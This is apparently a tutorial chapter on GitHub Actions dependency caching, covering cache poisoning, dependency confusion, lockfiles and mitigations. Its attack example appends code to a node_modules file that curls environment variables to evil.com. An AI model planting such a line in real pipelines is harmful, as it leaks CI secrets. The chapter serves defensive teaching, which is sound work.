# Chapter 7: Dependency Caching and Cache Poisoning

## Mental Model

**Dependency cache = Trust boundary**

Cached dependencies execute in your build → **can run arbitrary code**

## Caching Strategies

### Strategy 1: Content-Hash Key (Best)
```yaml
- uses: actions/cache@v3
  with:
    path: ~/.npm
    key: npm-${{ hashFiles('package-lock.json') }}
```

**Pros:** Cache invalidates when dependencies change  
**Cons:** Cache miss on every dependency update

### Strategy 2: Restore Keys (Performance)
```yaml
- uses: actions/cache@v3
  with:
    path: ~/.npm
    key: npm-${{ hashFiles('package-lock.json') }}
    restore-keys: |
      npm-${{ github.ref }}-
      npm-
```

**Pros:** Partial cache hits (faster)  
**Cons:** Can restore stale dependencies

### Strategy 3: Time-Based (Dangerous)
```yaml
key: npm-${{ github.run_number }}  # DON'T!
```

**Problem:** Never hits cache (new key every run)

## Cache Poisoning Attack

**Scenario:** Malicious PR

```yaml
# Step 1 (attacker's PR)
- run: |
    npm install
    echo "require('child_process').exec('curl evil.com?data=$(env)')" >> node_modules/package/index.js

- uses: actions/cache@v3
  with:
    path: node_modules
    key: deps  # Poison cache with malicious  code
```

**Step 2 (next workflow, even on main):**
```yaml
- uses: actions/cache@v3
  with:
    path: node_modules
    key: deps  # Restore poisoned cache!

- run: npm test  # Executes malicious code
```

## Mitigation Strategies

### 1. Branch-Scoped Caches
```yaml
key: deps-${{ github.ref }}-${{ hashFiles('lockfile') }}
```

**Effect:** PRs can't poison main branch cache

### 2. Read-Only for PRs
```yaml
- uses: actions/cache@v3
  with:
    path: ~/.npm
    key: npm-${{ hashFiles('package-lock.json') }}
    save-always: false  # Don't save cache from PRs
```

### 3. Verify Cache Integrity
```yaml
- uses: actions/cache@v3
  id: cache
  with:
    path: node_modules
    key: deps-${{ hashFiles('package-lock.json') }}

- if: steps.cache.outputs.cache-hit == 'true'
  run: |
    # Verify integrity
    npm ci --prefer-offline
    # If lockfile doesn't match, this fails
```

### 4. Separate PR and Main Caches
```yaml
key: deps-${{ github.base_ref || github.ref }}-${{ hashFiles('lockfile') }}
# PRs use base_ref (target branch), main uses ref
```

## Dependency Confusion Attack

**Attack vector:**
```yaml
# Attacker publishes malicious package with same name as internal one
```

**During `npm install`:**
```
1. Check npmjs.com → finds attacker's package (public)
2. Check internal registry → finds your package
3. Uses HIGHER VERSION (attacker's)
```

**Fix:**
```json
// .npmrc
@yourcompany:registry=https://npm.internal.com
```

## Lockfile Bypass

**Problem:**
```yaml
- run: npm install  # Ignores lockfile if missing!
```

**Better:**
```yaml
- run: npm ci  # Fails if lockfile missing/stale
```

**Difference:**
- `npm install`: Updates lockfile, installs latest
- `npm ci`: Fails if lockfile doesn't match, reproducible

## Interview Questions

**Q1:** Cache key is `deps-main`. PR poisons it. Will main branch use poisoned cache?

**A:** **Yes!** Same key. Mitigation: include `${{ github.ref }}` or use `github.base_ref` for PRs.

**Q2:** Why use `npm ci` instead of `npm install` in CI?

**A:**
- `npm ci` fails if lockfile stale (catches errors)
- Reproducible builds (doesn't update lockfile)
- Faster (skips dependency resolution)
- Deletes `node_modules` first (clean state)

**Q3:** Cache hit but build fails with version mismatch. Why?

**A:**
- Lockfile changed but cache key didn't include hash
- Platform differences (Linux vs Mac native deps)
- Corrupted cache
- Partial cache write

## Key Takeaways

- Cache keys MUST include lockfile hash
- PRs should not write to main branch caches
- Use `npm ci` not `npm install` in CI
- Verify cache integrity after restore
- Separate cache scopes (branch, PR vs main)
- Watch for dependency confusion attacks
